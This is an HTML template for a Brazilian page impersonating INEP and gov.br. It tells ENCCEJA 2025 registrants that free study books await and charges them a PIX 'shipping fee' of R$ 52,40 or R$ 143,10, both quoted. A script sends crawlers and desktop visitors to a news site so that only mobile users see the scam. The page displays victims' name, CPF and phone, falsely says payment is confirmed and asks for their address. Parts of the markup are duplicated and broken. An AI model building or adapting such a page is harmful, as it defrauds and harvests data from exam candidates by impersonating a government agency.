<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "qs9kqwmhmp");
    </script>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <script>
        // Função para detectar se é um dispositivo móvel
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Função para detectar se é um bot
        function isBot() {
            const botAgents = [
            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
            ];

            return botAgents.some(bot => navigator.userAgent.includes(bot));
        }

        // Função para verificar se a largura da janela é maior que 768px
        function isWideScreen() {
            return window.innerWidth > 768;
        }

        // Redirecionar ou bloquear o acesso
        function checkAccess() {
            if (isBot() || (!isMobile() && isWideScreen())) {
            // Redirecionar para o site G1 se o acesso for bloqueado
            window.location.href = "https://g1.globo.com/";
            }
        }

        // Executar a função de verificação ao carregar a página
        window.onload = checkAccess;

        // Adicionar um listener para verificar novamente se a janela for redimensionada
        window.addEventListener('resize', checkAccess);
    </script>
    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1418766538994503');
        fbq('init', '1345433039826605');
        fbq('init', '1390026985502891');
        fbq('init', '190097557439571');  // Novo pixel adicionado
        fbq('init', '1226790281278977'); // Novo pixel adicionado
        fbq('track', 'PageView');
        
        // Track purchase conversion
        const eventData = {
            value: 52.40,
            currency: 'BRL',
            content_name: 'Taxa de Envio - Material Didático ENCCEJA 2025',
            content_type: 'product',
            content_ids: ['encceja-2025-material-didatico']
        };
        
        fbq('track', 'InitiateCheckout', eventData);
        fbq('trackSingle', '1345433039826605', 'InitiateCheckout', eventData);
        fbq('trackSingle', '1390026985502891', 'InitiateCheckout', eventData);
        fbq('trackSingle', '190097557439571', 'InitiateCheckout', eventData);
        fbq('trackSingle', '1226790281278977', 'InitiateCheckout', eventData);
    </script>
    <noscript>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1418766538994503&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1345433039826605&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1390026985502891&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=190097557439571&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1226790281278977&ev=PageView&noscript=1"/>
    </noscript>
    <!-- End Facebook Pixel Code -->
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Material Didático Gratuito</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
    <style>
        @font-face {
            font-family: 'rawline';
            src: url('/static/fonts/rawline-500.woff2') format('woff2'),
                 url('/static/fonts/rawline-500.woff') format('woff');
            font-weight: 500;
            font-style: normal;
        }
        
        @font-face {
            font-family: 'rawline';
            src: url('/static/fonts/rawline-700.woff2') format('woff2'),
                 url('/static/fonts/rawline-700.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }
        
        body {
            font-family: 'rawline', sans-serif;
        }
        
        @keyframes moveButton {
            0%, 100% { transform: translateX(0); }
            50% { transform: translateX(10px); }
        }
        #payFeeButton {
            animation: moveButton 1.5s ease-in-out infinite;
            background-color: #f44336;
        }
        #payFeeButton:hover {
            background-color: #d32f2f;
        }
        .icon-container {
            margin-top: 10px;
            position: relative;
        }
        .icon-container img {
            position: relative;
            top: 10px;
            left: 2px;
        }
        .icon-container::before {
            content: '';
            position: absolute;
            top: 10px;
            left: 0;
            height: 100%;
            width: 4px;
            background-color: #f8f9fa;
        }
        .alert-box {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .next-step-box {
            background-color: #044785;
        }
        .next-step-box p {
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 95%;
            height: 70%;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .popup-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #044785;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        .gov-header {
            background-color: #222222;
        }
        .inep-header {
            background-color: #044785;
        }
        .form-header {
            background-color: #2c5985;
            color: white;
            font-weight: 600;
        }
        .footer-bg {
            background-color: #1c2b39;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen bg-white">
    <!-- Government Header -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#">
                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6" />
            </a>
            <nav>
                <ul class="flex space-x-4 text-[10px]">
                    <li>
                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
                    </li>
                    <li>
                        <a class="hover:underline" href="#">PARTICIPE</a>
                    </li>
                    <li>
                        <a class="hover:underline" href="#">SERVIÇOS</a>
                    </li>
                </ul>
            </nav>
        </div>
    </header>
    <!-- INEP Header -->
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <style>
                        .cls-2{fill:#fff}
                    </style>
                </defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
            </svg>
        </div>
    </div>
    <!-- ENCCEJA Logo -->
    <div class="text-center py-6">
        <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
    </div>

    <div class="p-6 flex flex-col items-center bg-white mt-0">
        <div class="mb-4 relative">
        </div>
        <h1 class="text-[22px] font-bold text-center mb-2">Material Didático ENCCEJA 2025</h1>
        <div class="text-white text-center mb-2 bg-green-600 p-4 rounded-md">
            <p class="text-[17px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);"><strong>PARABÉNS!</strong> Sua inscrição no ENCCEJA 2025 foi confirmada com sucesso.</p>
        </div>
    </div>
    <main class="container mx-auto px-4 py-2">
        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
            <div class="flex items-center mb-2">
                <h2 class="font-bold text-[18px]" style="color: #044785;">Prezado(a) <span id="userFirstName">
                    {% if customer.name %}
                        {{ customer.name.split()[0] }}
                    {% else %}
                        Participante
                    {% endif %}
                </span>:</h2>
            </div>
            <p class="text-[16px] leading-relaxed" style="color: #333;">
                Para auxiliar na sua preparação para o ENCCEJA 2025, o Ministério da Educação (MEC) está oferecendo <strong>GRATUITAMENTE</strong> um kit completo de materiais didáticos especialmente desenvolvidos para o exame.
            </p>
            
            <div class="mt-4 p-6 bg-gray-50 rounded-md shadow-sm">
                <div class="flex flex-col md:flex-row gap-6">
                    <!-- Imagem do material didático -->
                    <div class="md:w-1/2">
                        <img 
                            src="https://i.ibb.co/dkkmXcd/livros-encceja.jpg" 
                            alt="Material Didático do ENCCEJA" 
                            class="w-full h-auto rounded-md shadow-sm"
                        >
                    </div>
                    
                    <!-- Detalhes do material -->
                    <div class="md:w-1/2">
                        <h3 class="text-xl font-bold mb-2" style="color: #044785;">Material Didático Oficial</h3>
                        <p class="text-[16px] leading-relaxed mb-4" style="color: #333;">
                            O kit inclui quatro volumes de livros didáticos com todo o conteúdo exigido no ENCCEJA 2025:
                        </p>
                        <ul class="list-disc pl-5 mb-4 text-[16px]" style="color: #333;">
                            <li>Livro de Linguagens, Códigos e suas Tecnologias</li>
                            <li>Livro de Matemática e suas Tecnologias</li>
                            <li>Livro de Ciências Humanas e suas Tecnologias</li>
                            <li>Livro de Ciências da Natureza e suas Tecnologias</li>
                        </ul>
                        
                        <div class="bg-white p-4 rounded-md border border-gray-200 mb-4">
                    <div class="bg-white p-4 rounded-md border border-gray-200 mb-4">
                        <h4 class="font-bold mb-2">Informações da sua inscrição:</h4>
                        <p><strong>Nome:</strong> <span id="customerName">{{ customer.name }}</span></p>
                        <p><strong>CPF:</strong> <span id="customerCpf">{{ customer.cpf }}</span></p>
                        <p><strong>Telefone:</strong> <span id="customerPhone">{{ customer.phone }}</span></p>
                        <p><strong>Pagamento:</strong> <span class="text-green-600 font-bold">CONFIRMADO</span></p>
                    </div>
                    
                    <div class="bg-blue-50 p-4 rounded-md border border-blue-200 mb-4">
                        <h4 class="font-bold mb-2 text-blue-800">Prazo de Entrega:</h4>
                        <p class="text-blue-800">O material será enviado em até 7 dias úteis após a confirmação do pagamento da taxa de envio.</p>
                    </div>
                        <div class="bg-blue-50 p-4 rounded-md border border-blue-200 mb-4">
                            <h4 class="font-bold mb-2 text-blue-800">Prazo de Entrega:</h4>
                            <p class="text-blue-800">O material será enviado em até 7 dias úteis após a confirmação do pagamento da taxa de envio.</p>
                        </div>
                    </div>
                </div>
                
                <div class="mt-6">
                    <h3 class="text-lg font-bold mb-2" style="color: #044785;">Detalhes do Envio</h3>
                    <p class="mb-4">Para receber seu material didático, preencha os dados abaixo:</p>
                    
                    <form id="shippingForm" class="bg-white p-4 border border-gray-200 rounded-md">
                        <div class="mb-4">
                            <label for="address" class="block mb-1 font-semibold">Endereço Completo:</label>
                            <input type="text" id="address" name="address" class="w-full p-2 border border-gray-300 rounded-md" placeholder="Rua, número, complemento" required>
                        </div>
                        
                        <div class="mb-4">
                            <label for="city" class="block mb-1 font-semibold">Cidade:</label>
                            <input type="text" id="city" name="city" class="w-full p-2 border border-gray-300 rounded-md" required>
                        </div>
                        
                        <div class="grid grid-cols-2 gap-4 mb-4">
                            <div>
                                <label for="state" class="block mb-1 font-semibold">Estado:</label>
                                <select id="state" name="state" class="w-full p-2 border border-gray-300 rounded-md" required>
                                    <option value="">Selecione</option>
                                    <option value="AC">Acre</option>
                                    <option value="AL">Alagoas</option>
                                    <option value="AP">Amapá</option>
                                    <option value="AM">Amazonas</option>
                                    <option value="BA">Bahia</option>
                                    <option value="CE">Ceará</option>
                                    <option value="DF">Distrito Federal</option>
                                    <option value="ES">Espírito Santo</option>
                                    <option value="GO">Goiás</option>
                                    <option value="MA">Maranhão</option>
                                    <option value="MT">Mato Grosso</option>
                                    <option value="MS">Mato Grosso do Sul</option>
                                    <option value="MG">Minas Gerais</option>
                                    <option value="PA">Pará</option>
                                    <option value="PB">Paraíba</option>
                                    <option value="PR">Paraná</option>
                                    <option value="PE">Pernambuco</option>
                                    <option value="PI">Piauí</option>
                                    <option value="RJ">Rio de Janeiro</option>
                                    <option value="RN">Rio Grande do Norte</option>
                                    <option value="RS">Rio Grande do Sul</option>
                                    <option value="RO">Rondônia</option>
                                    <option value="RR">Roraima</option>
                                    <option value="SC">Santa Catarina</option>
                                    <option value="SP">São Paulo</option>
                                    <option value="SE">Sergipe</option>
                                    <option value="TO">Tocantins</option>
                                </select>
                            </div>
                            
                            <div>
                                <label for="zipcode" class="block mb-1 font-semibold">CEP:</label>
                                <input type="text" id="zipcode" name="zipcode" class="w-full p-2 border border-gray-300 rounded-md" placeholder="00000-000" required>
                            </div>
                        </div>
                        
                        <!-- Taxa de envio -->
                        <div class="bg-gray-50 p-4 rounded-md mb-4">
                            <div class="flex justify-between items-center">
                                <div>
                                    <h4 class="font-bold">Taxa de envio:</h4>
                                    <p class="text-sm text-gray-600">Envio do material via Correios</p>
                                </div>
                                <div class="text-lg font-bold">R$ 52,40</div>
                        <div class="mb-4">
                            <label for="postalCode" class="block mb-1 font-semibold">CEP:</label>
                            <input type="text" id="postalCode" name="postalCode" class="w-full p-2 border border-gray-300 rounded-md" required>
                        </div>
                        
                        <div class="mt-4">
                            <h3 class="text-xl font-bold mb-2" style="color: #044785;">Taxa de Envio</h3>
                            <p class="text-[16px] mb-4">Para enviarmos o material didático, é necessário o pagamento da taxa de envio no valor de <strong>R$ 143,10</strong>.</p>
    <!-- Popup de pagamento PIX -->
    <div id="overlay" class="overlay"></div>
    <div id="pixPaymentPopup" class="popup">
        <div class="p-4 h-full overflow-auto">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">Pagamento PIX</h2>
                <button id="closePopup" class="text-gray-500 hover:text-gray-800">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            
            <div id="pixContent" class="flex flex-col items-center">
                <p class="text-center mb-2">Escaneie o QR Code abaixo ou copie o código PIX:</p>
                <div class="my-4">
                    <img id="pixQrCode" src="" alt="QR Code PIX" class="w-64 h-64 mx-auto border">
                </div>
                
                <div class="w-full mb-4">
                    <label for="pixCodeText" class="block text-sm font-medium text-gray-700 mb-1">Código PIX:</label>
                    <div class="flex">
                        <input type="text" id="pixCodeText" readonly class="flex-grow p-2 border border-gray-300 rounded-l-md" value="">
                        <button id="copyPixCode" class="bg-gray-200 px-4 rounded-r-md hover:bg-gray-300">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
                
                <p id="pixStatus" class="text-center font-bold my-2">AGUARDANDO PAGAMENTO</p>
                
                <div id="paymentInstructions" class="w-full mt-2">
                    <ol class="list-decimal pl-5 text-[15px]">
                        <li>Abra o aplicativo do seu banco</li>
                        <li>Escolha a opção "Pagar com PIX"</li>
                        <li>Escaneie o QR Code ou copie e cole o código PIX</li>
                        <li>Confirme as informações e finalize o pagamento</li>
                    </ol>
                    
                    <p class="text-sm mt-4 text-center text-gray-600">O pagamento será confirmado automaticamente em alguns instantes.</p>
                </div>
                
                <div id="paymentConfirmation" class="hidden text-center w-full mt-4">
                    <p class="text-green-600 font-bold mb-2">PAGAMENTO APROVADO!</p>
                    <p class="mb-4">Seu material didático será enviado nos próximos dias úteis.</p>
                    <button id="confirmReceipt" class="bg-blue-600 text-white py-2 px-4 rounded hover:bg-blue-700">
                        Entendi
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Loading Popup -->
    <div id="loadingPopup" class="popup" style="display:none;">
        <div class="popup-content">
            <div class="loader"></div>
            <p class="mt-4">Gerando pagamento...</p>
        </div>
    </div>
                            
                            <button id="createPaymentBtn" type="button" class="w-full bg-red-600 text-white py-3 rounded-md font-bold hover:bg-red-700 transition">
                                PAGAR TAXA DE ENVIO (R$ 143,10)
                            </button>
                        </div>
                    </form>
                </div>
            </div>
            
            <div class="mt-6 bg-blue-50 p-4 rounded-md border border-blue-200">
                <h3 class="font-bold mb-2" style="color: #044785;">Atenção:</h3>
                <p class="text-[15px]">O material didático é <strong>GRATUITO</strong>. Você está pagando apenas a <strong>taxa de envio</strong> de R$ 52,40 referente aos custos dos Correios para entrega do material em seu endereço.</p>
            </div>
            
            <div class="mt-6">
                <h3 class="text-lg font-bold mb-2" style="color: #044785;">Prazo de Entrega</h3>
                <p class="mb-4">O material será enviado em até 5 dias úteis após a confirmação do seu endereço e o pagamento da taxa de envio. O prazo de entrega pelos Correios é de 7 a 15 dias úteis, dependendo da sua localidade.</p>
            </div>
        </div>
    </main>
    
    <!-- Footer -->
    <footer class="footer-bg text-white py-6 mt-auto">
        <div class="container mx-auto px-4">
            <div class="flex flex-col items-center">
                <div class="mb-4">
                    <img src="https://www.gov.br/inep/pt-br/themes/padrao_gov_br/img/govbr-colorido-negativo.png" alt="Governo Federal" class="h-8">
                </div>
                <div class="text-center text-xs">
                    <p>© 2025 Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</p>
                    <p>Todos os direitos reservados</p>
                </div>
            </div>
        </div>
    </footer>
    
    <script>
        // Capturar os parâmetros da URL
        const urlParams = new URLSearchParams(window.location.search);
        
        // Popular o primeiro nome do usuário
        const userFirstName = document.getElementById('userFirstName');
        const userName = "{{ customer.name }}";
        
        if (userName) {
            const firstName = userName.split(' ')[0];
            userFirstName.textContent = firstName;
        }
        
        // Manipular o formulário de envio
        document.getElementById('shippingForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Aqui você poderia adicionar validação de formulário
            
            // Redirecionar para a página de pagamento
            window.location.href = '/pagamento?valor=52.40&descricao=Taxa+de+Envio+-+Material+Didático+ENCCEJA+2025';
        });
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Elementos do DOM
            const createPaymentBtn = document.getElementById("createPaymentBtn");
            const overlay = document.getElementById("overlay");
            const pixPaymentPopup = document.getElementById("pixPaymentPopup");
            const loadingPopup = document.getElementById("loadingPopup");
            const closePopupBtn = document.getElementById("closePopup");
            const pixQrCode = document.getElementById("pixQrCode");
            const pixCodeText = document.getElementById("pixCodeText");
            const copyPixCodeBtn = document.getElementById("copyPixCode");
            const pixStatus = document.getElementById("pixStatus");
            const paymentInstructions = document.getElementById("paymentInstructions");
            const paymentConfirmation = document.getElementById("paymentConfirmation");
            const confirmReceiptBtn = document.getElementById("confirmReceipt");
            
            // Dados do cliente
            const customerName = document.getElementById("customerName").textContent.trim();
            const customerCpf = document.getElementById("customerCpf").textContent.trim();
            const customerPhone = document.getElementById("customerPhone").textContent.trim();
            
            let transactionId = null;
            let checkStatusInterval = null;
            
            // Funções para o user-agent
            function getRandomUserAgent() {
                const userAgents = [
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36"
                ];
                return userAgents[Math.floor(Math.random() * userAgents.length)];
            }
            
            // Ao clicar no botão de pagamento
            createPaymentBtn.addEventListener("click", function() {
                // Exibir overlay e popup de carregamento
                overlay.style.display = "block";
                loadingPopup.style.display = "block";
                
                // Dados para o pagamento
                const paymentData = {
                    nome: customerName,
                    cpf: customerCpf,
                    telefone: customerPhone,
                };
                
                // Criar pagamento
                fetch("/create-book-payment", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "User-Agent": getRandomUserAgent(),
                    },
                    body: JSON.stringify(paymentData)
                })
                .then(response => response.json())
                .then(data => {
                    console.log("Resposta do pagamento:", data);
                    
                    // Ocultar popup de carregamento
                    loadingPopup.style.display = "none";
                    
                    if (data.error) {
                        alert("Erro ao gerar pagamento: " + data.error);
                        overlay.style.display = "none";
                        return;
                    }
                    
                    // Extrair ID da transação para verificação posterior
                    transactionId = data.id || data.transactionId;
                    
                    // Exibir o QR code e código PIX
                    if (data.pixQrCode) {
                        pixQrCode.src = data.pixQrCode;
                    } else {
                        // Usar QR code de exemplo se não estiver disponível
                        pixQrCode.src = "https://i.ibb.co/kynQqLN/qr-code-example.png";
                    }
                    
                    // Atualizar o código PIX
                    pixCodeText.value = data.pixCode || data.copy_paste || data.code || "";
                    
                    // Exibir popup de pagamento PIX
                    pixPaymentPopup.style.display = "block";
                    
                    // Iniciar verificação de status
                    startStatusCheck();
                })
                .catch(error => {
                    console.error("Erro na requisição:", error);
                    loadingPopup.style.display = "none";
                    alert("Erro ao processar o pagamento. Por favor, tente novamente.");
                    overlay.style.display = "none";
                });
            });
            
            // Iniciar verificação de status de pagamento
            function startStatusCheck() {
                if (!transactionId) {
                    console.log("Sem ID de transação para verificar");
                    return;
                }
                
                // Verificar imediatamente
                checkPaymentStatus();
                
                // Continuar verificando a cada 5 segundos
                checkStatusInterval = setInterval(checkPaymentStatus, 5000);
            }
            
            // Função para verificar o status do pagamento
            function checkPaymentStatus() {
                if (!transactionId) return;
                
                console.log("Verificando status do pagamento:", transactionId);
                
                fetch(`/check-for4payments-status?transaction_id=${encodeURIComponent(transactionId)}&amount=143.10`, {
                    headers: {
                        "X-Requested-With": "XMLHttpRequest",
                        "X-Cache-Buster": Date.now(),
                        "User-Agent": getRandomUserAgent()
                    }
                })
                .then(response => response.json())
                .then(data => {
                    console.log("Resposta do status do pagamento:", data);
                    
                    // Verificar se o pagamento foi aprovado
                    if (data.status === "completed" || 
                        data.status === "COMPLETED" || 
                        data.status === "paid" || 
                        data.status === "PAID" || 
                        data.original_status === "APPROVED" || 
                        data.original_status === "PAID" || 
                        data.original_status === "COMPLETED") {
                        
                        // Parar de verificar o status
                        if (checkStatusInterval) {
                            clearInterval(checkStatusInterval);
                        }
                        
                        // Registrar evento do Facebook Pixel
                        if (typeof fbq !== "undefined") {
                            fbq("track", "Purchase", {
                                value: 143.10,
                                currency: "BRL",
                                content_type: "product",
                                content_ids: ["material-didatico-encceja-2025"]
                            });
                        }
                        
                        // Atualizar status na interface
                        pixStatus.innerHTML = "<strong class="text-green-600">PAGAMENTO CONFIRMADO</strong>";
                        paymentInstructions.style.display = "none";
                        paymentConfirmation.style.display = "block";
                    } else {
                        console.log("Pagamento ainda pendente. Status:", data.status || data.original_status);
                    }
                })
                .catch(error => {
                    console.error("Erro ao verificar status:", error);
                });
            }
            
            // Copiar código PIX para a área de transferência
            copyPixCodeBtn.addEventListener("click", function() {
                pixCodeText.select();
                document.execCommand("copy");
                alert("Código PIX copiado!");
            });
            
            // Fechar popup
            closePopupBtn.addEventListener("click", function() {
                pixPaymentPopup.style.display = "none";
                overlay.style.display = "none";
                
                // Parar verificação de status ao fechar o popup
                if (checkStatusInterval) {
                    clearInterval(checkStatusInterval);
                }
            });
            
            // Fechar popup após confirmação de recebimento
            if (confirmReceiptBtn) {
                confirmReceiptBtn.addEventListener("click", function() {
                    pixPaymentPopup.style.display = "none";
                    overlay.style.display = "none";
                });
            }
        });
    </script>
    </script>
</body>
</html>